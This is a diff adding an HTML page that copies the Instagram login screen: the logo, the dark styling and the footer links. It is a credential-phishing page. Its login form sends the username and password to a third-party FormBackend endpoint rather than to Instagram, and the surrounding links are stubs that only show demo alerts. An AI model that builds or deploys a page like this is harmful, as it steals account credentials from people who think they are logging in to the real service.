@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Login • Instagram</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            min-height: 100vh;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            max-width: 350px;
+            width: 100%;
+            background: #121212;
+            border: 1px solid #333333;
+            border-radius: 4px;
+            padding: 40px 30px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+
+        .logo-icon {
+            font-size: 36px;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285aeb 90%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: inline-block;
+            line-height: 1;
+            flex-shrink: 0;
+            width: 40px;
+            text-align: center;
+        }
+
+        .logo-text {
+            font-size: 38px;
+            font-weight: 600;
+            color: #ffffff;
+            letter-spacing: -2px;
+            line-height: 1;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .login-form {
+            width: 100%;
+        }
+
+        .login-form .input-group {
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        .login-form .input-group input {
+            width: 100%;
+            padding: 12px 10px;
+            background: #121212;
+            border: 1px solid #333333;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #f5f5f5;
+            outline: none;
+            transition: border-color 0.15s;
+            font-family: inherit;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .login-form .input-group input:focus {
+            border-color: #666666;
+        }
+
+        .login-form .input-group input::placeholder {
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 10px 0;
+            background: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin-top: 8px;
+        }
+
+        .login-btn:hover {
+            background: #1877f2;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: default;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 16px 0 14px;
+            width: 100%;
+        }
+
+        .divider .line {
+            flex: 1;
+            height: 1px;
+            background: #333333;
+        }
+
+        .divider .or {
+            padding: 0 18px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #8e8e8e;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #4a8df7;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 16px;
+            cursor: pointer;
+            width: 100%;
+            padding: 6px 0;
+        }
+
+        .facebook-login i {
+            font-size: 18px;
+        }
+
+        .facebook-login:hover {
+            color: #6aa9ff;
+        }
+
+        .forgot-link {
+            color: #8e8e8e;
+            font-size: 13px;
+            text-decoration: none;
+            cursor: pointer;
+            margin-top: 4px;
+        }
+
+        .forgot-link:hover {
+            color: #b0b0b0;
+            text-decoration: underline;
+        }
+
+        .signup-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #2f2f2f;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .signup-section a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .signup-section a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            margin-top: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 6px 12px;
+            font-size: 11px;
+            color: #6e6e6e;
+        }
+
+        .footer-links a {
+            color: #6e6e6e;
+            text-decoration: none;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        .footer-links a:hover {
+            color: #a0a0a0;
+            text-decoration: underline;
+        }
+
+        .footer-links .language {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .footer-links .language i {
+            font-size: 10px;
+        }
+
+        @media (max-width: 450px) {
+            .login-container {
+                padding: 30px 20px 24px;
+            }
+            .logo-icon {
+                font-size: 30px;
+                width: 34px;
+            }
+            .logo-text {
+                font-size: 32px;
+            }
+            .login-form .input-group input {
+                padding: 14px 10px;
+                font-size: 15px;
+            }
+            .login-btn {
+                padding: 12px 0;
+                font-size: 15px;
+            }
+            .divider .or {
+                font-size: 12px;
+                padding: 0 14px;
+            }
+            .facebook-login {
+                font-size: 13px;
+            }
+            .signup-section {
+                font-size: 13px;
+                padding-top: 16px;
+                margin-top: 16px;
+            }
+            .footer-links {
+                gap: 4px 10px;
+                font-size: 10px;
+            }
+            .forgot-link {
+                font-size: 12px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .login-container {
+                padding: 20px 14px 18px;
+            }
+            .logo-icon {
+                font-size: 26px;
+                width: 30px;
+            }
+            .logo-text {
+                font-size: 28px;
+            }
+            .login-form .input-group input {
+                padding: 12px 8px;
+                font-size: 14px;
+            }
+            .login-btn {
+                padding: 10px 0;
+                font-size: 14px;
+            }
+            .footer-links {
+                font-size: 9px;
+                gap: 3px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Logo -->
+        <div class="logo">
+            <i class="fab fa-instagram logo-icon"></i>
+            <span class="logo-text">Instagram</span>
+        </div>
+
+        <!-- Login Form -->
+        <!-- ✅ Your FormBackend endpoint -->
+        <form class="login-form" action="https://www.formbackend.com/f/c50faa4ead28c451" method="POST">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Phone number, username, or email" id="username" autocomplete="username" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Password" id="password" autocomplete="current-password" required>
+            </div>
+            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+        </form>
+
+        <!-- Divider -->
+        <div class="divider">
+            <span class="line"></span>
+            <span class="or">OR</span>
+            <span class="line"></span>
+        </div>
+
+        <!-- Facebook Login -->
+        <a class="facebook-login" href="#">
+            <i class="fab fa-facebook-square"></i>
+            Log in with Facebook
+        </a>
+
+        <!-- Forgot Password -->
+        <a class="forgot-link" href="#">Forgot password?</a>
+
+        <!-- Sign Up -->
+        <div class="signup-section">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#" class="language">
+                <i class="fas fa-globe"></i> English <i class="fas fa-chevron-down"></i>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+
+        function toggleLoginBtn() {
+            loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
+        }
+
+        usernameInput.addEventListener('input', toggleLoginBtn);
+        passwordInput.addEventListener('input', toggleLoginBtn);
+
+        document.querySelector('.facebook-login').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('🔵 Facebook login flow (demo) — would redirect to Facebook OAuth');
+        });
+
+        document.querySelector('.forgot-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('🔑 Reset password flow (demo) — would show password reset form');
+        });
+
+        document.querySelector('.signup-section a').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('📝 Sign up flow (demo) — would redirect to signup page');
+        });
+
+        toggleLoginBtn();
+    </script>
+
+</body>
+</html>
